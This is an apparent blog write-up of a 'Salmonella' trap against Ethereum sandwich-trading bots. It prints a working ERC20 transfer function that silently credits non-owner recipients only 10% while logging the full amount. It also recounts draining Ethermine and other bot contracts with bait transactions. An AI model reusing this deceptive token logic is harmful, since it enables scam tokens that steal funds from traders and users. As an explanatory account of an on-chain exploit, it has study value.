## Wrecking sandwich traders for fun and profit

Those who follow the action in Ethereum’s mempool will no doubt be aware of the sudden recent boom in [sandwich trading](https://medium.com/coinmonks/demystify-the-dark-forest-on-ethereum-sandwich-attacks-5a3aec9fa33e). For the uninformed, sandwich trading is a very interesting strategy which involves placing a trade before AND after a victim trade, in order to exploit the slippage that has been created.

In layman's terms, you see that someone will buy an asset, so you buy it first to artificially inflate the price, before selling afterwards at a profit.

This strategy used to be extremely risky, as Ethereum carries no guarantee that your transactions will succeed, and having only one transaction succeed can leave you the bag holder of a lot of worthless tokens. The mempool is a fun place, but it’s not a safe place.

However, a recent rise in MEV services such as [FlashBots](https://medium.com/flashbots/frontrunning-the-mev-crisis-40629a613752) now allows traders to create “sandwich bundles”, where either all 3 transactions execute, or none of them execute. At the same time, there has also been a rise in miner trading teams, who mine the sandwich bundles directly into their blocks.

These two innovations together led to a cavalier attitude on trading forums as sandwich traders rejoiced in the profits of their new “risk free” alpha. As trad(itional) finance morphs into chad finance, it's easy to get sucked up in the excitement.

However, nothing is risk-free on the blockchain, and exploitative trading strategies such as sandwich trading and front-running actually _increase_ in risk the more the engineer attempts to generalise their ability to capture opportunities.

To illustrate to novice traders the risks of playing in the mempool, I have conducted a demonstration of a new trading alpha I call “Salmonella”, which involves intentionally exploiting the generalised nature of front-running setups. The goal of sandwich trading is to exploit the slippage of unintended victims, so this strategy turns the tables on the exploiters.

A quick analysis of the blockchain revealed that an outfit named “[Ethermine](https://ethermine.org/)” is currently responsible for the bulk of sandwich trading, and had amassed a [couple of hundred Ethereum](https://etherscan.io/address/0xf6da21e95d74767009accb145b96897ac3630bad) through their sandwich trading sender address. Having settled on my initial target, I got to work analyzing their setup.

The Ethermine setup was/is fairly basic at the time of writing, relying on hitting the [Uniswap router](https://etherscan.io/address/0x7a250d5630b4cf539739df2c5dacb4c659f2488d) to execute trades. Their trading history was littered with reverts and their smart contract itself was holding a variety of tokens from failed trades. With this in mind I got to work creating my Salmonella contracts.

The premise of the Salmonella contract is very simple. It’s a regular ERC20 token, which behaves exactly like any other ERC20 token in normal use-cases. However, it has some special logic to detect when anyone other than the specified owner is transacting it, and in these situations it only returns 10% of the specified amount - despite emitting event logs which match a trade of the full amount.

The poisonous transfer function:
```
function _transfer(address sender, address recipient, uint256 amount) internal virtual {
  require(sender != address(0), "ERC20: transfer from the zero address");
  require(recipient != address(0), "ERC20: transfer to the zero address");
  uint256 senderBalance = _balances[sender];
  require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
  if (sender == ownerA || sender == ownerB) {
    _balances[sender] = senderBalance - amount;
    _balances[recipient] += amount;
  } else {
    _balances[sender] = senderBalance - amount;
    uint256 trapAmount = (amount * 10) / 100;
    _balances[recipient] += trapAmount;
  }
  emit Transfer(sender, recipient, amount);
}
```

I deployed the [Salmonella contract](https://etherscan.io/token/0x610b8B78da143fC1E38b36C4EA0f68F86cc3b4f4), then set up a simple [Uniswap pool](https://etherscan.io/address/0x5e0453a08550d10effffabdc370ae9ae3d7edd7e) containing Salmonella and Ethereum. I then replicated the detection maths for sandwich trading using binary search, to create a series of bait transactions which to Ethermine and other sandwich traders would look like juicy opportunities.

Finally, I coded an executing architecture, giving me the ability to quickly cancel trades, change gas prices, and reset the state of my trap Uniswap pool.

After a couple of strong coffees I got to work, launching a series of bait transactions, carefully pricing just below market gas to keep the transactions in the mempool, but cancelling if the price started dropping.

Within a few hours I had my [first hit](https://etherscan.io/tx/0x2dacb3fa8f32811ce832c0b59b8e4cab35e55655058974cbb71824d2039790c7), scooping over 68 ETH from their bots attempts to wreck my bait. Another few hours passed and I scooped a [further 35 ETH](https://etherscan.io/tx/0x515d28f2e515d549a51f804f5f205db5bb8680e5d54ed335593fe3b6b119a380) from their contract.

Happy to call it a night, I casually had a browse of my Salmonella smart contract, only to find I had emptied about [17 other Sandwich trading contracts](https://etherscan.io/token/0x610b8b78da143fc1e38b36c4ea0f68f86cc3b4f4#balances) in the course of my experiment, for much smaller values than Ethermine of course.

I continued this strategy for a couple of days, emptying a bunch more sandwich contracts along the way, but the alpha quickly decayed as the wrecked sandwich traders adjusted their setups to better detect my poisonous tokens.

All in all a fun experiment, which I now present to the community as a caution. Being a DeFi degenerate is a lot of fun, but be careful in your trading - because this game is highly adversarial and we play for keeps.

See you in the mempool!


----------
If you enjoyed this DeFi-Cartel writeup and are a serious trader, miner, or other player in the space, we are always open to potential revenue-generating ventures. Feel free to [get in touch](https://t.me/nathan_LCS) if you have a great idea on how we might collaborate.